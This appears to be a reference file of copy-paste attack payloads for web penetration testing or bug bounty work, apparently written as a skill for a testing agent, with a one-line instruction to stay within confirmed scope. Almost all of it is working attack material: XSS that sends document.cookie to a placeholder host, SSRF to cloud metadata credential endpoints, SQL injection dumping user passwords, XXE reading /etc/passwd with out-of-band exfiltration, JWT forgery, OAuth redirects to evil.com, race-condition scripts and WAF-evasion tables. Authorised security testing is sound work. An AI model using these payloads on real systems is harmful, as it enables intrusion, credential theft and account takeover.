---
name: payloads
description: Security payloads, bypass tables, WAF evasion, race condition templates. Copy-paste ready. For root causes see exploit. For validation see verdict.
---

# PAYLOADS

Payloads are test inputs, not findings. Use only within confirmed scope, record the exact request/response, and validate impact through verdict.

---

## XSS

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
"><img src=x onerror=fetch('https://BURP/c='+document.cookie)>
```

CSP bypass: `<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>`

DOM sinks: `innerHTML` `outerHTML` `document.write()` `eval()` `setTimeout(string)` `location.href` `element.src`

## SSRF

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/metadata/v1/maintenance
```

IP bypass: `http://127.1` `http://0x7f000001` `http://2130706433` `http://[::1]` `http://0` `http://127.0.0.1.nip.io`

## SQLi

```sql
' OR '1'='1                            -- detection
' UNION SELECT NULL,NULL,NULL--        -- column count
' UNION SELECT username,password,NULL FROM users--
'; SELECT SLEEP(5)--                   -- blind
```

WAF bypass: `/*!50000UNION*/ /*!50000SELECT*/` `CONCAT(0x61,0x64,0x6d,0x69,0x6e)` `'%0bOR%0b'1'='1`

## XXE

```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
```

Blind OOB: `<!ENTITY % xxe SYSTEM "http://BURP/out?%file;"> %xxe;`

Via upload: malicious `[Content_Types].xml` in DOCX/XLSX ZIP

## PATH TRAVERSAL

```
../../../etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
..%00/etc/passwd
```

## IDOR / AUTH BYPASS

```
GET /api/users/OTHER_ID               -- swap ID
PUT /api/v1/orders/456                 -- old API version
DELETE /api/users/OTHER_ID             -- method swap
GET /api/users?user_id=OTHER_ID       -- param add
```

## JWT

```bash
# None algorithm
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_'
# RS256→HS256 confusion
openssl s_client -connect target:443 | openssl x509 -pubkey -noout > pub.pem
python3 -c "import jwt; print(jwt.encode({'role':'admin'}, open('pub.pem').read(), algorithm='HS256'))"
```

## OAUTH

```
redirect_uri=https://evil.com                     -- open redirect
redirect_uri=https://target.com@evil.com           -- parser bypass
redirect_uri=https://target.com/.evil.com          -- path traversal
redirect_uri=https://target.com%0d%0a%0d%0aevil    -- CRLF
```

Start without `state` param → if 302 success, CSRF via OAuth.

## SSTI

```
{{7*7}}                    -- Jinja2/Twig → 49
${7*7}                     -- Freemarker → 49
<%= 7*7 %>                 -- ERB → 49
{{7*'7'}}                  -- Jinja2 → 7777777 (vs Twig → 49)
```

## RACE CONDITION

```python
# Turbo Intruder
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')
```

```bash
# curl parallel (20 simultaneous)
seq 1 20 | xargs -P20 -I{} curl -s -o /dev/null -w "%{http_code}\n" -X POST "$URL" -H "Cookie: $COOKIE" -d "$BODY"
```

Targets: coupon redeem, gift card, limited stock, rate limit, email verify, like/vote.

## PROTOTYPE POLLUTION

```json
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
```

Grep: `merge(` `extend(` `clone(` `deepCopy(` with user input reaching nested object assignment.

## GRAPHQL

```graphql
{__schema{types{name fields{name type{name}}}}}
{node(id:"BASE64_ID"){...on User{email}}}
[{"query":"mutation{login(u:\"a\",p:\"FUZZ\"){token}}"},...]
```

## WAF BYPASS

| WAF | Technique |
|---|---|
| Cloudflare | Unicode normalization `ⓢⓔⓛⓔⓒⓣ`, chunk TE |
| Akamai | Parameter pollution `?id=1&id=UNION+SELECT` |
| Generic | Double URL encode `%2527`, null byte `%00`, case swap `SeLeCt` |
| Any | HTTP/2 CRLF, multipart boundary, JSON content-type |

## GF PATTERNS

`gf xss` `gf sqli` `gf ssrf` `gf redirect` `gf lfi` `gf idor` `gf rce` `gf debug_logic` `gf ssti` `gf cors`

## WORDLISTS

Use external wordlists available in the disposable workspace. Keep wordlist choice tied to the current target, program rules, and rate limits.
